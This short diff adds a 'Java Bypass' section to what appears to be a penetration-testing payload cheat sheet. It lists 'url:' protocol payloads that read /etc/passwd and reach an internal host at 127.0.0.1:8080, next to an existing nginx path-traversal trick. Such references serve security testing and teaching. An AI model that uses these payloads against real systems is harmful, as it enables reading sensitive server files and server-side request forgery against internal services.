@@ -99,6 +99,16 @@ To bypass this behaviour just add forward slashes in front of the url:
 ```http://nginx-server////////../../```
 
 
+### Java Bypass
+
+Bypass Java's URL protocol
+
+```powershell
+url:file:///etc/passwd
+url:http://127.0.0.1:8080
+```
+
+
 ## Path Traversal
 
 ### Interesting Linux files
